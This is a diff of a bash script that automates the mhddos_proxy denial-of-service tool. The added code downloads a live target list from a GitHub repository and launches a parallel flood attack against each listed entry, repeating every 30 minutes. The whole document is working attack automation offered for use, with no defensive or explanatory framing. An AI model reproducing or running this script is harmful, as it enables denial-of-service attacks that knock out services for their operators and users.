@@ -118,7 +118,7 @@ file_tmp="/var/tmp/tmp.targets"
 
 echo "" | tee $file $file_tmp
 
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets -o $file_tmp
+curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets_parts -o $file_tmp
 
 cat $file_tmp | while read LINE; do
     if [[ $LINE != "#"* ]]; then
@@ -143,7 +143,16 @@ sleep 5
 while true; do
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $file $threads $rpc $methods&
-        sleep 30m
+        list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+         while [[ $list_size = "0"  ]]; do
+            sleep 5
+            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+        done
+        for (( i=1; i<=list_size; i++ )); do
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
+            python3 ~/multidd/mhddos_proxy/runner.py $cmd_line $threads&
+        done
+sleep 30m
 done
 
 #old part backup
